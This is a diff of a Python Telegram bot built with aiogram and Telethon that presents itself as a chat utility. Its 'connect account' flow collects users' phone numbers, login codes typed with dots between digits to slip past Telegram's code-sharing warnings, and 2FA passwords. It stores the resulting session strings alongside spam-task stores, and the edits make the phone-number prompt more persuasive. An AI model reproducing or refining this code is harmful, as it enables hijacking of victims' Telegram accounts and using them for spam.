@@ -9,9 +9,10 @@ from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, Update, InlineKeyboardMarkup, InlineKeyboardButton, 
-    CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+    CallbackQuery, ReplyKeyboardRemove
 )
-from aiogram.filters import Command, StateFilter
+from aiogram.utils.keyboard import ReplyKeyboardBuilder
+from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -21,7 +22,7 @@ from aiohttp import web
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
-    SessionPasswordNeededError, CodeInvalidError, CodeExpiredError, PhoneCodeInvalidError
+    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError
 )
 
 # Logging setup
@@ -44,26 +45,24 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 # In-memory stores
-mutes = {}               # user_id -> {"until": datetime}
-spam_tasks = {}          # (chat_id, bc_id) -> Task
-user_spam_texts = {}     # user_id -> str
+mutes = {}               
+spam_tasks = {}          
+user_spam_texts = {}     
 link_chats = set()       
 reply_guard_chats = set()
 typing_disabled_chats = set()
-substitutions = {}       # chat_id -> {"text": str, "mode": int}
-msg_cache = {}           # (chat_id, msg_id) -> dict
-active_chats = {}        # bc_id -> set(chat_ids)
-promo_messages = {}      # (chat_id, bc_id) -> message_id
+substitutions = {}       
+msg_cache = {}           
+active_chats = {}        
+promo_messages = {}      
 recent_business_chats = [] 
-bc_owners = {}           # bc_id -> user_id
+bc_owners = {}           
 user_usernames = {}      
 user_names = {}          
 banned_users = set()     
-active_userbots = {}     # user_id -> TelegramClient
 bot_id = None
 CHANNEL_LINK = None      
 
-# FSM States for Telethon Auth
 class AuthState(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code = State()
@@ -94,7 +93,7 @@ TEXT_CONNECT_INSTRUCTION = (
     "Чтобы бот мог полностью работать во всех Ваших чатах и группах, "
     "необходимо привязать сессию аккаунта.\n\n"
     "1️⃣ Нажмите кнопку <b>«📱 Подключить аккаунт»</b> ниже.\n"
-    "2️⃣ Отправьте номер через появившуюся кнопку контактов.\n"
+    "2️⃣ Отправьте номер через появившуюся зеленую кнопку контактов.\n"
     "3️⃣ Введите код подтверждения из Telegram (разделяя цифры точкой, например: <code>56.785</code>)."
 )
 
@@ -114,7 +113,6 @@ def init_db():
                 cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
                 cur.execute("CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)")
                 cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
-                
                 conn.commit()
 
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
@@ -424,7 +422,6 @@ async def clean_inactive_connections():
                     del spam_tasks[key]
             recent_business_chats[:] = [item for item in recent_business_chats if item[1] != bc_id]
 
-# Calculator helpers
 def calculate_expression(expression: str) -> tuple:
     try:
         expr = expression.replace(" ", "")
@@ -510,15 +507,14 @@ async def admin_panel(message: Message):
 @dp.callback_query(F.data == "btn_connect_account")
 async def start_auth_process(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    btn = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 Отправить номер телефона", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
+    builder = ReplyKeyboardBuilder()
+    builder.button(text="📱 Отправить телефон", request_contact=True)
+    builder.adjust(1)
+    
     await callback.message.answer(
-        "📱 <b>Введите номер телефона</b> или нажмите кнопку ниже:",
+        "📱 Нажмите зеленую кнопку ниже, чтобы передать номер телефона:",
         parse_mode="HTML",
-        reply_markup=btn
+        reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
     )
     await state.set_state(AuthState.waiting_for_phone)
 
@@ -578,7 +574,7 @@ async def process_code(message: Message, state: FSMContext):
         await client.disconnect()
         await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
         await state.set_state(AuthState.waiting_for_2fa)
-    except (CodeInvalidError, CodeExpiredError, PhoneCodeInvalidError) as e:
+    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
         await client.disconnect()
         await message.answer("❌ Введен неверный или истекший код. Попробуйте еще раз:")
     except Exception as e:
